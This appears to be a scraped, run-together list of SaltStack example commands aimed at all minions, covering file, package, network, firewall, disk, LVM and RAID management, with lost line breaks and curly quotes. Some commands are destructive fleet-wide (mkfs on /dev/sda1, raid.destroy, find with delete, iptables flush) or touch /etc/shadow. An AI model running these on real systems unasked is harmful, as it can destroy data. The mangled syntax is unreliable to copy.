&lt;settings_module&gt; &lt;command&gt;salt ‘*’ django.createsuperuser &lt;settings_module&gt; user user@example.comsalt ‘*’ django.loaddata &lt;settings_module&gt; &lt;comma delimited list of fixtures&gt;salt ‘*’ django.syncdb &lt;settings_module&gt;salt ‘*’ dnsmasq.versionsalt ‘*’ dnsmasq.get_configsalt ‘*’ dnsmasq.get_config file=/etc/dnsmasq.confsalt ‘*’ dnsmasq.set_config domain=mydomain.comsalt ‘*’ dnsmasq.set_config follow=False domain=mydomain.comsalt ‘*’ dnsmasq.set_config file=/etc/dnsmasq.conf domain=mydomain.comsalt ‘*’ dnsmasq.versionsalt ‘*’ dnsutil.hosts_append /etc/hosts 127.0.0.1 ad1.yuk.co,ad2.yuk.cosalt ‘*’ dnsutil.hosts_remove /etc/hosts ad1.yuk.cosalt ‘*’ dnsutil.hosts_remove /etc/hosts ad2.yuk.co,ad1.yuk.cosalt ‘*’ dnsutil.parse_hostssalt ‘*’ environ.get foosalt ‘*’ environ.get baz default=Falsesalt ‘*’ environ.has_value foosalt ‘*’ environ.item foosalt ‘*’ environ.item ‘[foo, baz]’ default=Nonesalt ‘*’ environ.itemssalt ‘*’ environ.setenv ‘&#123;“foo”: “bar”, “baz”: “quux”&#125;’salt ‘*’ environ.setenv ‘&#123;“a”: “b”, “c”: False&#125;’ false_unsets=Truesalt ‘*’ environ.setval foo barsalt ‘*’ environ.setval baz val=False false_unsets=Truesalt ‘*’ event.fire ‘&#123;“data”:”my event data”&#125;’ ‘tag’salt ‘*’ event.fire_master ‘&#123;“data”:”my event data”&#125;’ ‘tag’salt ‘*’ extfs.attributes /dev/sda1salt ‘*’ extfs.blocks /dev/sda1salt ‘*’ extfs.dump /dev/sda1salt ‘*’ extfs.mkfs /dev/sda1 fs_type=ext4 opts=’acl,noexec’salt ‘*’ extfs.tune /dev/sda1 force=True label=wildstallyns opts=’acl,noexec’salt ‘*’ file.access /path/to/file fsalt ‘*’ file.access /path/to/file xsalt ‘*’ file.append /etc/motd \\salt ‘*’ file.append /etc/motd args=’cheese=spam’salt ‘*’ file.append /etc/motd args=”[‘cheese=spam’,’spam=cheese’]”salt ‘*’ file.blockreplace /etc/hosts ‘#– start managed zone foobar : DO NOT EDIT –‘ \\salt ‘*’ file.check_file_meta /etc/httpd/conf.d/httpd.conf salt://http/httpd.conf ‘&#123;hash_type: ‘md5′, ‘hsum': &lt;md5sum&gt;&#125;’ root, root, ‘755’ basesalt ‘*’ file.check_hash /etc/fstab md5:&lt;md5sum&gt;salt ‘*’ file.check_managed /etc/httpd/conf.d/httpd.conf salt://http/httpd.conf ‘&#123;hash_type: ‘md5′, ‘hsum': &lt;md5sum&gt;&#125;’ root, root, ‘755’ jinja True None None basesalt ‘*’ file.check_managed_changes /etc/httpd/conf.d/httpd.conf salt://http/httpd.conf ‘&#123;hash_type: ‘md5′, ‘hsum': &lt;md5sum&gt;&#125;’ root, root, ‘755’ jinja True None None basesalt ‘*’ file.check_perms /etc/sudoers ‘&#123;&#125;’ root root 400salt ‘*’ file.chgrp /etc/passwd rootsalt ‘*’ file.chown /etc/passwd root rootsalt ‘*’ file.comment /etc/modules pcspkrsalt ‘*’ file.contains /etc/crontab ‘mymaintenance.sh’salt ‘*’ file.contains_glob /etc/foobar ‘*cheese*’salt ‘*’ file.contains_regex /etc/crontabsalt ‘*’ file.contains_regex_multiline /etc/crontab ‘^maint’salt ‘*’ file.copy /path/to/src /path/to/dstsalt ‘*’ file.copy /path/to/src_dir /path/to/dst_dir recurse=Truesalt ‘*’ file.copy /path/to/src_dir /path/to/dst_dir recurse=True remove_existing=Truesalt ‘*’ file.restore_backup /foo/bar/baz.txt 0salt ‘*’ file.directory_exists /etcsalt ‘*’ file.extract_hash /etc/foo sha512 /path/to/hash/filesalt ‘*’ file.file_exists /etc/passwdsalt ‘*’ file.find / type=f name=\\*.bak size=+10msalt ‘*’ file.find /var mtime=+30d size=+10m print=path,size,mtimesalt ‘*’ file.find /var/log name=\\*.[0-9] mtime=+30d size=+10m deletesalt ‘*’ file.get_devmm /dev/chrsalt ‘*’ file.get_diff /home/fred/.vimrc salt://users/fred/.vimrcsalt ‘*’ file.get_gid /etc/passwdsalt ‘*’ file.get_group /etc/passwdsalt ‘*’ file.get_hash /etc/shadowsalt ‘*’ file.get_managed /etc/httpd/conf.d/httpd.conf jinja salt://http/httpd.conf ‘&#123;hash_type: ‘md5′, ‘hsum': &lt;md5sum&gt;&#125;’ root root ‘755’ base None Nonesalt ‘*’ file.get_mode /etc/passwdsalt ‘*’ file.get_selinux_context /etc/hostssalt ‘*’ file.get_sum /etc/passwd sha512salt ‘*’ file.get_uid /etc/passwdsalt ‘*’ file.get_user /etc/passwdsalt ‘*’ file.gid_to_group 0salt ‘*’ file.grep /etc/passwd nobodysalt ‘*’ file.grep /etc/sysconfig/network-scripts/ifcfg-eth0 ipaddr ” -i”salt ‘*’ file.grep /etc/sysconfig/network-scripts/ifcfg-eth0 ipaddr ” -i -B2″salt ‘*’ file.grep “/etc/sysconfig/network-scripts/*” ipaddr ” -i -l”salt ‘*’ file.group_to_gid rootsalt ‘*’ file.is_blkdev /dev/blksalt ‘*’ file.is_chrdev /dev/chrsalt ‘*’ file.is_fifo /dev/fifosalt ‘*’ file.is_link /path/to/linksalt ‘*’ file.join ‘/’ ‘usr’ ‘local’ ‘bin’salt ‘*’ file.chown /etc/passwd root rootsalt ‘*’ file.link /path/to/file /path/to/linksalt ‘*’ file.list_backups /foo/bar/baz.txtsalt ‘*’ file.list_backups /foo/bar/baz.txtsalt ‘*’ file.lstat /path/to/filesalt ‘*’ file.makedirs /opt/code/salt ‘*’ file.makedirs_perms /opt/codesalt ‘*’ file.manage_file /etc/httpd/conf.d/httpd.conf ” ‘&#123;&#125;’ salt://http/httpd.conf ‘&#123;hash_type: ‘md5′, ‘hsum': &lt;md5sum&gt;&#125;’ root root ‘755’ base ”salt ‘*’ file.mkdir /opt/jetty/contextsalt ‘*’ file.mknod /dev/chr c 180 31salt ‘*’ file.mknod /dev/blk b 8 999salt ‘*’ file.nknod /dev/fifo psalt ‘*’ file.mknod_blkdev /dev/blk 8 999salt ‘*’ file.mknod_chrdev /dev/chr 180 31salt ‘*’ file.mknod_fifo /dev/fifosalt ‘*’ file.open_filessalt ‘*’ file.open_files by_pid=Truesalt ‘*’ file.pardirsalt ‘*’ file.patch /opt/file.txt /tmp/file.txt.patchsalt ‘*’ file.path_exists_glob /etc/pam*/pass*salt ‘*’ file.prepend /etc/motd \\salt ‘*’ file.prepend /etc/motd args=’cheese=spam’salt ‘*’ file.prepend /etc/motd args=”[‘cheese=spam’,’spam=cheese’]”salt ‘*’ file.sed /etc/httpd/httpd.conf ‘LogLevel warn’ ‘LogLevel info’salt ‘*’ file.readdir /path/to/dir/salt ‘*’ file.readlink /path/to/linksalt ‘*’ file.remove /tmp/foosalt ‘*’ file.restore_backup /foo/bar/baz.txt 0salt ‘*’ file.rename /path/to/src /path/to/dstsalt ‘*’ file.replace /path/to/file pattern=”bind-address\\s*=” repl=’bind-address:’salt ‘*’ file.replace /path/to/file pattern=’=’ repl=':’salt ‘*’ file.replace /etc/httpd/httpd.conf pattern=’LogLevel warn’ repl=’LogLevel info’salt ‘*’ file.replace /some/file pattern=’before’ repl=’after’ flags='[MULTILINE, IGNORECASE]’salt ‘*’ file.restore_backup /foo/bar/baz.txt 0salt ‘*’ file.restorecon /home/user/.ssh/authorized_keyssalt ‘*’ file.rmdir /tmp/foo/salt ‘*’ file.search /etc/crontab ‘mymaintenance.sh’salt ‘*’ file.sed /etc/httpd/httpd.conf ‘LogLevel warn’ ‘LogLevel info’salt ‘*’ file.contains /etc/crontab ‘mymaintenance.sh’salt ‘*’ file.seek_read /path/to/file 4096 0salt ‘*’ file.seek_write /path/to/file ‘some data’ 4096salt ‘*’ file.set_mode /etc/passwd 0644salt ‘*’ file.set_selinux_context path &lt;role&gt; &lt;type&gt; &lt;range&gt;salt ‘*’ file.source_list salt://http/httpd.conf ‘&#123;hash_type: ‘md5′, ‘hsum': &lt;md5sum&gt;&#125;’ basesalt ‘*’ file.stats /etc/passwdsalt ‘*’ file.statvfs /path/to/filesalt ‘*’ file.symlink /path/to/file /path/to/linksalt ‘*’ file.touch /var/log/emptyfilesalt ‘*’ file.truncate /path/to/file 512salt ‘*’ file.uid_to_user 0salt ‘*’ file.uncomment /etc/hosts.deny ‘ALL: PARANOID’salt ‘*’ file.user_to_uid rootsalt ‘*’ file.write /etc/motd \\salt ‘*’ file.write /etc/motd args=’cheese=spam’salt ‘*’ file.write /etc/motd args=”[‘cheese=spam’,’spam=cheese’]”salt ‘*’ gem.install vagrantsalt ‘*’ gem.listsalt ‘*’ gem.sources_add http://rubygems.org/salt ‘*’ gem.sources_listsalt ‘*’ gem.sources_remove http://rubygems.org/salt ‘*’ gem.uninstall vagrantsalt ‘*’ gem.update vagrantsalt ‘*’ gem.update_systemsalt ‘*’ grains.append key valsalt ‘*’ grains.delval keysalt ‘*’ grains.filter_by ‘&#123;Debian: Debheads rule, RedHat: I love my hat&#125;’salt ‘*’ grains.filter_by ‘&#123;A: B, C: &#123;D: &#123;E: F,G: H&#125;&#125;&#125;’ ‘xxx’ ‘&#123;D: &#123;E: I&#125;,J: K&#125;’ ‘C’salt ‘*’ grains.get pkg:apachesalt ‘*’ grains.get_or_set_hash ‘django:SECRET_KEY’ 50salt ‘*’ grains.has_value pkg:apachesalt ‘*’ grains.item ossalt ‘*’ grains.item os osrelease oscodenamesalt ‘*’ grains.item host sanitize=Truesalt ‘*’ grains.itemssalt ‘*’ grains.items sanitize=Truesalt ‘*’ grains.lssalt ‘*’ grains.remove key valsalt ‘*’ grains.setval key valsalt ‘*’ grains.setval key “&#123;‘sub-key': ‘val’, ‘sub-key2′: ‘val2′&#125;”salt ‘*’ grains.setvals “&#123;‘key1′: ‘val1′, ‘key2′: ‘val2′&#125;”salt ‘*’ group.add foo 3456salt ‘*’ group.adduser foo barsalt ‘*’ group.chgid foo 4376salt ‘*’ group.delete foosalt ‘*’ group.deluser foo barsalt ‘*’ group.getentsalt ‘*’ group.info foosalt ‘*’ group.members foo ‘user1,user2,user3,…’salt ‘*’ grub.confsalt ‘*’ grub.versionsalt ‘*’ hashutil.base64_decodestring ‘Z2V0IHNhbHRlZA==salt ‘*’ hashutil.base64_encodestring ‘get salted’salt ‘*’ hashutil.hmac_signature ‘get salted’ ‘shared secret’ ‘NS2BvKxFRk+rndAlFbCYIFNVkPtI/3KiIYQw4okNKU8=’salt ‘*’ hashutil.md5_digest ‘get salted’salt ‘*’ hashutil.sha256_digest ‘get salted’salt ‘*’ hashutil.sha512_digest ‘get salted’salt ‘*’ hg.archive /path/to/repo output=/tmp/archive.tgz fmt=tgzsalt ‘*’ hg.clone /path/to/repo https://bitbucket.org/birkenfeld/sphinxsalt ‘*’ hg.describe /path/to/reposalt ‘*’ hg.pull /path/to/repo opts=-usalt ‘*’ hg.revision /path/to/repo mybranchsalt ‘*’ hosts.add_host &lt;ip&gt; &lt;alias&gt;salt ‘*’ hosts.get_alias &lt;ip addr&gt;salt ‘*’ hosts.get_ip &lt;hostname&gt;salt ‘*’ hosts.has_pair &lt;ip&gt; &lt;alias&gt;salt ‘*’ hosts.list_hostssalt ‘*’ hosts.rm_host &lt;ip&gt; &lt;alias&gt;salt ‘*’ hosts.set_host &lt;ip&gt; &lt;alias&gt;salt ‘*’ img.bootstrap /srv/salt-images/host.qcow 4096 qcow2salt ‘*’ img.mount_image /tmp/foosalt ‘*’ img.mount_image /tmp/foosalt ‘*’ img.umount_image /mnt/foosalt ‘*’ incron.list_tab rootsalt ‘*’ incron.list_tab rootsalt ‘*’ incron.raw_cron rootsalt ‘*’ incron.raw_system_cronsalt ‘*’ incron.rm_job root /pathsalt ‘*’ incron.rm_job root /pathsalt ‘*’ incron.set_job root ‘/root’ ‘IN_MODIFY’ ‘echo “$$ $@ $# $% $&amp;”‘salt ‘*’ incron.write_incron_file_verbose root /tmp/new_cronsalt ‘*’ incron.write_cron_file root /tmp/new_cronsalt ‘*’ ini.get_option /path/to/ini section_name option_namesalt ‘*’ ini.get_section /path/to/ini section_namesalt ‘*’ ini.remove_option /path/to/ini section_name option_namesalt ‘*’ ini.remove_section /path/to/ini section_namesalt ‘*’ ini.set_option /path/to/ini ‘&#123;section_foo: &#123;key: value&#125;&#125;’salt ‘*’ ip.apply_network_settingssalt ‘*’ ip.build_bond bond0 mode=balance-albsalt ‘*’ ip.build_interface eth0 eth &lt;settings&gt;salt ‘*’ ip.build_network_settings &lt;settings&gt;salt ‘*’ ip.build_routes eth0 &lt;settings&gt;salt ‘*’ ip.down eth0salt ‘*’ ip.get_bond bond0salt ‘*’ ip.get_interface eth0salt ‘*’ ip.get_network_settingssalt ‘*’ ip.get_routes eth0salt ‘*’ ip.up eth0salt ‘*’ iptables.append filter INPUT \\salt ‘*’ iptables.append filter INPUT \\salt ‘*’ iptables.build_rule match=state \\salt ‘*’ iptables.build_rule filter INPUT command=I position=3 \\salt ‘*’ iptables.build_rule filter INPUT command=A \\salt ‘*’ iptables.build_rule filter INPUT command=A \\salt ‘*’ iptables.build_rule filter INPUT command=A \\salt ‘*’ iptables.build_rule match=state \\salt ‘*’ iptables.build_rule filter INPUT command=I position=3 \\salt ‘*’ iptables.check filter INPUT \\salt ‘*’ iptables.check filter INPUT \\salt ‘*’ iptables.check_chain filter INPUTsalt ‘*’ iptables.check_chain filter INPUT family=ipv6salt ‘*’ iptables.delete filter INPUT position=3salt ‘*’ iptables.delete filter INPUT \\salt ‘*’ iptables.delete filter INPUT position=3 family=ipv6salt ‘*’ iptables.delete filter INPUT \\salt ‘*’ iptables.delete_chain filter CUSTOM_CHAINsalt ‘*’ iptables.delete_chain filter CUSTOM_CHAIN family=ipv6salt ‘*’ iptables.flush filter INPUTsalt ‘*’ iptables.flush filter INPUT family=ipv6salt ‘*’ iptables.get_policy filter INPUTsalt ‘*’ iptables.get_policy filter INPUT family=ipv6salt ‘*’ iptables.get_rulessalt ‘*’ iptables.get_rules family=ipv6salt ‘*’ iptables.get_saved_policy filter INPUTsalt ‘*’ iptables.get_saved_policy filter INPUT \\salt ‘*’ iptables.get_saved_policy filter INPUT family=ipv6salt ‘*’ iptables.get_saved_policy filter INPUT \\salt ‘*’ iptables.get_saved_rulessalt ‘*’ iptables.get_saved_rules family=ipv6salt ‘*’ iptables.insert filter INPUT position=3 \\salt ‘*’ iptables.insert filter INPUT position=3 \\salt ‘*’ iptables.new_chain filter CUSTOM_CHAINsalt ‘*’ iptables.new_chain filter CUSTOM_CHAIN family=ipv6salt ‘*’ iptables.save /etc/sysconfig/iptablessalt ‘*’ iptables.save /etc/sysconfig/iptables family=ipv6salt ‘*’ iptables.set_policy filter INPUT ACCEPTsalt ‘*’ iptables.set_policy filter INPUT ACCEPT family=ipv6salt ‘*’ iptables.versionsalt ‘*’ iptables.version family=ipv6salt ‘*’ key.fingersalt ‘*’ key.finger_mastersalt ‘*’ kmod.availablesalt ‘*’ kmod.check_available kvmsalt ‘*’ kmod.is_loaded kvmsalt ‘*’ kmod.load kvmsalt ‘*’ kmod.lsmodsalt ‘*’ kmod.mod_listsalt ‘*’ kmod.remove kvmsalt ‘*’ locale.avail ‘en_US.UTF-8′salt ‘*’ locale.gen_locale ‘en_US.UTF-8′salt ‘*’ locale.get_localesalt ‘*’ locale.list_availsalt ‘*’ locale.set_locale ‘en_US.UTF-8′salt ‘*’ locate.locatesalt ‘*’ locate.statssalt ‘*’ locate.updatedbsalt ‘*’ locate.versionsalt ‘*’ logrotate.set rotate 2salt ‘*’ logrotate.set /var/log/wtmp rotate 2salt ‘*’ logrotate.show_confsalt ‘*’ lowpkg.file_dict httpdsalt ‘*’ lowpkg.file_dict httpd postfixsalt ‘*’ lowpkg.file_dictsalt ‘*’ lowpkg.file_list httpdsalt ‘*’ lowpkg.file_list httpd postfixsalt ‘*’ lowpkg.file_listsalt ‘*’ lowpkg.list_pkgssalt ‘*’ lowpkg.verifysalt ‘*’ lowpkg.verify httpdsalt ‘*’ lowpkg.verify ‘httpd postfix’salt ‘*’ lowpkg.verify ‘httpd postfix’ ignore_types=[‘config’,’doc’]salt ‘*’ lvm.fullversionsalt ‘*’ lvm.lvcreate new_volume_name vg_name size=10Gsalt ‘*’ lvm.lvcreate new_volume_name vg_name extents=100 /dev/sdbsalt ‘*’ lvm.lvcreate new_snapshot vg_name snapshot=volume_name size=3Gsalt ‘*’ lvm.lvdisplaysalt ‘*’ lvm.lvdisplay /dev/vg_myserver/rootsalt ‘*’ lvm.lvremove lvname vgname force=Truesalt ‘*’ lvm.pvdisplaysalt ‘*’ lvm.pvdisplay /dev/md0salt ‘*’ lvm.versionsalt ‘*’ lvm.vgdisplaysalt ‘*’ lvm.vgdisplay nova-volumessalt ‘*’ match.compound ‘L@cheese,foo and *’salt ‘*’ match.data ‘spam:eggs’salt ‘*’ match.filter_by ‘&#123;foo*: Foo!, bar*: Bar!&#125;’ minion_id=bar03salt ‘*’ match.glob ‘*’salt ‘*’ match.grain ‘os:Ubuntu’salt ‘*’ match.grain ‘ipv6|2001:db8::ff00:42:8329′ delimiter=’|’salt ‘*’ match.grain_pcre ‘os:Fedo.*’salt ‘*’ match.grain_pcre ‘ipv6|2001:.*’ delimiter=’|’salt ‘*’ match.ipcidr ‘192.168.44.0/24′salt ‘*’ match.list ‘server1,server2′salt ‘*’ match.pcre ‘.*’salt ‘*’ match.pillar ‘cheese:foo’salt ‘*’ match.pillar ‘clone_url|https://github.com/saltstack/salt.git’ delimiter=’|’salt ‘*’ mine.delete ‘network.interfaces’salt ‘*’ mine.flushsalt ‘*’ mine.get ‘*’ network.interfacessalt ‘*’ mine.get ‘os:Fedora’ network.interfaces grainsalt ‘*’ mine.get ‘os:Fedora and S@192.168.5.0/24′ network.ipaddrs compoundsalt ‘*’ mine.get_dockersalt ‘*’ mine.get_docker interfaces=’eth0′salt ‘*’ mine.get_docker interfaces='[“eth0″, “eth1″]’salt ‘*’ mine.get_docker cidrs=’107.170.147.0/24′salt ‘*’ mine.get_docker cidrs='[“107.170.147.0/24″, “172.17.42.0/24″]’salt ‘*’ mine.get_docker interfaces='[“eth0″, “eth1″]’ cidrs='[“107.170.147.0/24″, “172.17.42.0/24″]’salt ‘*’ mine.send network.interfaces eth0salt ‘*’ mine.updatesalt ‘*’ modjk.bulk_activate node1,node2,node3 loadbalancer1salt ‘*’ modjk.bulk_activate node1,node2,node3 loadbalancer1 other-profilesalt ‘*’ modjk.bulk_activate [“node1″,”node2″,”node3″] loadbalancer1salt ‘*’ modjk.bulk_activate [“node1″,”node2″,”node3″] loadbalancer1 other-profilesalt ‘*’ modjk.bulk_disable node1,node2,node3 loadbalancer1salt ‘*’ modjk.bulk_disable node1,node2,node3 loadbalancer1 other-profilesalt ‘*’ modjk.bulk_disable [“node1″,”node2″,”node3″] loadbalancer1salt ‘*’ modjk.bulk_disable [“node1″,”node2″,”node3″] loadbalancer1 other-profilesalt ‘*’ modjk.bulk_recover node1,node2,node3 loadbalancer1salt ‘*’ modjk.bulk_recover node1,node2,node3 loadbalancer1 other-profilesalt ‘*’ modjk.bulk_recover [“node1″,”node2″,”node3″] loadbalancer1salt ‘*’ modjk.bulk_recover [“node1″,”node2″,”node3″] loadbalancer1 other-profilesalt ‘*’ modjk.bulk_stop node1,node2,node3 loadbalancer1salt ‘*’ modjk.bulk_stop node1,node2,node3 loadbalancer1 other-profilesalt ‘*’ modjk.bulk_stop [“node1″,”node2″,”node3″] loadbalancer1salt ‘*’ modjk.bulk_stop [“node1″,”node2″,”node3″] loadbalancer1 other-profilesalt ‘*’ modjk.dump_configsalt ‘*’ modjk.dump_config other-profilesalt ‘*’ modjk.get_runningsalt ‘*’ modjk.get_running other-profilesalt ‘*’ modjk.lb_edit loadbalancer1 “&#123;‘vlr': 1, ‘vlt': 60&#125;”salt ‘*’ modjk.lb_edit loadbalancer1 “&#123;‘vlr': 1, ‘vlt': 60&#125;” other-profilesalt ‘*’ modjk.list_configured_members loadbalancer1salt ‘*’ modjk.list_configured_members loadbalancer1 other-profilesalt ‘*’ modjk.recover_all loadbalancer1salt ‘*’ modjk.recover_all loadbalancer1 other-profilesalt ‘*’ modjk.reset_stats loadbalancer1salt ‘*’ modjk.reset_stats loadbalancer1 other-profilesalt ‘*’ modjk.versionsalt ‘*’ modjk.version other-profilesalt ‘*’ modjk.worker_activate node1 loadbalancer1salt ‘*’ modjk.worker_activate node1 loadbalancer1 other-profilesalt ‘*’ modjk.worker_disable node1 loadbalancer1salt ‘*’ modjk.worker_disable node1 loadbalancer1 other-profilesalt ‘*’ modjk.worker_edit node1 loadbalancer1 “&#123;‘vwf': 500, ‘vwd': 60&#125;”salt ‘*’ modjk.worker_edit node1 loadbalancer1 “&#123;‘vwf': 500, ‘vwd': 60&#125;” other-profilesalt ‘*’ modjk.worker_recover node1 loadbalancer1salt ‘*’ modjk.worker_recover node1 loadbalancer1 other-profilesalt ‘*’ modjk.worker_status node1salt ‘*’ modjk.worker_status node1 other-profilesalt ‘*’ modjk.worker_activate node1 loadbalancer1salt ‘*’ modjk.worker_activate node1 loadbalancer1 other-profilesalt ‘*’ modjk.workerssalt ‘*’ modjk.workers other-profilesalt ‘*’ mount.activesalt ‘*’ mount.fstabsalt ‘*’ mount.is_fuse_exec sshfssalt ‘*’ mount.is_mounted /mnt/sharesalt ‘*’ mount.mount /mnt/foo /dev/sdz1 Truesalt ‘*’ mount.remount /mnt/foo /dev/sdz1 Truesalt ‘*’ mount.rm_fstab /mnt/foosalt ‘*’ mount.set_fstab /mnt/foo /dev/sdz1 ext4salt ‘*’ mount.swapoff /root/swapfilesalt ‘*’ mount.swapon /root/swapfilesalt ‘*’ mount.swapssalt ‘*’ mount.umount /mnt/foosalt ‘*’ network.active_tcpsalt ‘*’ network.arpsalt ‘*’ network.connect archlinux.org 80salt ‘*’ network.connect archlinux.org 80 timeout=3salt ‘*’ network.connect archlinux.org 80 timeout=3 family=ipv4salt ‘*’ network.connect google-public-dns-a.google.com port=53 proto=udp timeout=3salt ‘*’ network.dig archlinux.orgsalt ‘*’ network.get_hostnamesalt ‘*’ network.hw_addr eth0salt ‘*’ network.hw_addr eth0salt ‘*’ network.in_subnet 10.0.0.0/16salt ‘*’ network.interface eth0salt ‘*’ network.interface_ip eth0salt ‘*’ network.interfacessalt ‘*’ network.ip_addrssalt ‘*’ network.ip_addrs6salt ‘*’ network.ip_addrssalt ‘*’ network.ip_addrs6salt ‘*’ network.is_loopback 127.0.0.1salt ‘*’ network.is_private 10.0.0.3salt ‘*’ network.mod_hostname master.saltstack.comsalt ‘*’ network.netstatsalt ‘*’ network.ping archlinux.orgsalt ‘*’ network.subnetssalt ‘*’ network.traceroute archlinux.orgsalt ‘*’ pillar.itemssalt ‘*’ pillar.ext ‘&#123;libvirt: _&#125;’salt ‘*’ pillar.get pkg:apachesalt ‘*’ pillar.item foosalt ‘*’ pillar.item foo bar bazsalt ‘*’ pillar.itemssalt ‘*’ pillar.rawsalt ‘*’ pillar.raw key=’roles’salt ‘*’ pip.freeze /home/code/path/to/virtualenv/salt ‘*’ pip.install &lt;package name&gt;,&lt;package2 name&gt;salt ‘*’ pip.install requirements=/path/to/requirements.txtsalt ‘*’ pip.install &lt;package name&gt; bin_env=/path/to/virtualenvsalt ‘*’ pip.install &lt;package name&gt; bin_env=/path/to/pip_binsalt ‘*’ pip.install markdown,django editable=git+https://github.com/worldcompany/djangoembed.git#egg=djangoembed upgrade=True no_deps=Truesalt ‘*’ pip.list saltsalt ‘*’ pip.uninstall &lt;package name&gt;,&lt;package2 name&gt;salt ‘*’ pip.uninstall requirements=/path/to/requirements.txtsalt ‘*’ pip.uninstall &lt;package name&gt; bin_env=/path/to/virtualenvsalt ‘*’ pip.uninstall &lt;package name&gt; bin_env=/path/to/pip_binsalt ‘*’ pip.versionsalt ‘*’ pkg.latest_version &lt;package name&gt;salt ‘*’ pkg.latest_version &lt;package name&gt; fromrepo=epel-testingsalt ‘*’ pkg.latest_version &lt;package name&gt; disableexcludes=mainsalt ‘*’ pkg.latest_version &lt;package1&gt; &lt;package2&gt; &lt;package3&gt; …salt ‘*’ pkg.check_db &lt;package1&gt; &lt;package2&gt; &lt;package3&gt;salt ‘*’ pkg.check_db &lt;package1&gt; &lt;package2&gt; &lt;package3&gt; fromrepo=epel-testingsalt ‘*’ pkg.check_db &lt;package1&gt; &lt;package2&gt; &lt;package3&gt; disableexcludes=mainsalt ‘*’ pkg.clean_metadatasalt ‘*’ pkg.del_repo myreposalt ‘*’ pkg.del_repo myrepo basedir=/path/to/dirsalt ‘*’ pkg.file_list httpdsalt ‘*’ pkg.file_list httpd postfixsalt ‘*’ pkg.file_listsalt ‘*’ pkg.file_list httpdsalt ‘*’ pkg.file_list httpd postfixsalt ‘*’ pkg.file_listsalt ‘*’ pkg.get_locked_packagessalt ‘*’ pkg.get_repo myreposalt ‘*’ pkg.get_repo myrepo basedir=/path/to/dirsalt ‘*’ pkg.group_diff ‘Perl Support’salt ‘*’ pkg.group_info ‘Perl Support’salt ‘*’ pkg.group_install ‘Group 1′salt ‘*’ pkg.group_install ‘Group 1,Group 2′salt ‘*’ pkg.group_install ‘[“Group 1″, “Group 2″]’salt ‘*’ pkg.group_install ‘My Group’ skip=’foo,bar’salt ‘*’ pkg.group_install ‘My Group’ skip='[“foo”, “bar”]’salt ‘*’ pkg.group_install ‘My Group’ include=’foo,bar’salt ‘*’ pkg.group_install ‘My Group’ include='[“foo”, “bar”]’salt ‘*’ pkg.group_listsalt ‘*’ pkg.hold &lt;package name&gt;salt ‘*’ pkg.hold pkgs='[“foo”, “bar”]’salt ‘*’ pkg.install &lt;package name&gt;salt ‘*’ pkg.install pkgs='[“foo”, “bar”]’salt ‘*’ pkg.install pkgs='[“foo”, &#123;“bar”: “1.2.3-4.el5″&#125;]’salt ‘*’ pkg.install sources='[&#123;“foo”: “salt://foo.rpm”&#125;, &#123;“bar”: “salt://bar.rpm”&#125;]’salt ‘*’ pkg.latest_version &lt;package name&gt;salt ‘*’ pkg.latest_version &lt;package name&gt; fromrepo=epel-testingsalt ‘*’ pkg.latest_version &lt;package name&gt; disableexcludes=mainsalt ‘*’ pkg.latest_version &lt;package1&gt; &lt;package2&gt; &lt;package3&gt; …salt ‘*’ pkg.list_pkgssalt ‘*’ pkg.list_repo_pkgssalt ‘*’ pkg.list_repo_pkgs foo bar bazsalt ‘*’ pkg.list_repo_pkgs ‘samba4*’ fromrepo=base,updatessalt ‘*’ pkg.list_repossalt ‘*’ pkg.list_upgradessalt ‘*’ pkg.mod_repo reponame enabled=1 gpgcheck=1salt ‘*’ pkg.mod_repo reponame basedir=/path/to/dir enabled=1salt ‘*’ pkg.mod_repo reponame baseurl= mirrorlist=http://host.com/salt ‘*’ pkg.normalize_name zsh.x86_64salt ‘*’ pkg.owner /usr/bin/apachectlsalt ‘*’ pkg.owner /usr/bin/apachectl /etc/httpd/conf/httpd.confsalt ‘*’ pkg.purge &lt;package name&gt;salt ‘*’ pkg.purge &lt;package1&gt;,&lt;package2&gt;,&lt;package3&gt;salt ‘*’ pkg.purge pkgs='[“foo”, “bar”]’salt ‘*’ pkg.refresh_dbsalt ‘*’ pkg.remove &lt;package name&gt;salt ‘*’ pkg.remove &lt;package1&gt;,&lt;package2&gt;,&lt;package3&gt;salt ‘*’ pkg.remove pkgs='[“foo”, “bar”]’salt ‘*’ pkg.unhold &lt;package name&gt;salt ‘*’ pkg.unhold pkgs='[“foo”, “bar”]’salt ‘*’ pkg.upgradesalt ‘*’ pkg.upgrade_available &lt;package name&gt;salt ‘*’ pkg.verifysalt ‘*’ pkg.verify httpdsalt ‘*’ pkg.verify ‘httpd postfix’salt ‘*’ pkg.verify ‘httpd postfix’ ignore_types=[‘config’,’doc’]salt ‘*’ pkg.version &lt;package name&gt;salt ‘*’ pkg.version &lt;package1&gt; &lt;package2&gt; &lt;package3&gt; …salt ‘*’ pkg_resource.add_pkg ‘&#123;&#125;’ bind 9salt ‘*’ pkg_resource.check_extra_requirements &lt;pkgname&gt; &lt;extra_requirements&gt;salt ‘*’ pkg_resource.pack_sources ‘[&#123;“foo”: “salt://foo.rpm”&#125;, &#123;“bar”: “salt://bar.rpm”&#125;]’salt ‘*’ pkg_resource.parse_targetssalt ‘*’ pkg_resource.sort_pkglist ‘[“3.45″, “2.13”]’salt ‘*’ pkg_resource.stringify ‘vim: 7.127′salt ‘*’ pkg_resource.version vimsalt ‘*’ pkg_resource.version foo bar bazsalt ‘*’ pkg_resource.version ‘python*’salt ‘*’ pkg_resource.version_clean &lt;version_string&gt;salt ‘*’ publish.full_data test.kwarg arg=’cheese=spam’salt ‘*’ publish.publish test.kwarg arg=’cheese=spam’salt ‘*’ pyenv.defaultsalt ‘*’ pyenv.default 2.0.0-p0salt ‘*’ pyenv.do ‘gem list bundler’salt ‘*’ pyenv.do ‘gem list bundler’ deploysalt ‘*’ pyenv.do_with_python 2.0.0-p0 ‘gem list bundler’salt ‘*’ pyenv.do_with_python 2.0.0-p0 ‘gem list bundler’ deploysalt ‘*’ pyenv.installsalt ‘*’ pyenv.install_python 2.0.0-p0salt ‘*’ pyenv.is_installedsalt ‘*’ pyenv.listsalt ‘*’ pyenv.rehashsalt ‘*’ pyenv.uninstall_python 2.0.0-p0salt ‘*’ pyenv.updatesalt ‘*’ pyenv.versionssalt ‘*’ raid.assemble /dev/md0 [‘/dev/xvdd’, ‘/dev/xvde’]salt ‘*’ raid.create /dev/md0 level=1 chunk=256 devices=”[‘/dev/xvdd’, ‘/dev/xvde’]” test_mode=Truesalt ‘*’ raid.detail /dev/md0salt ‘*’ raid.destroy /dev/md0salt 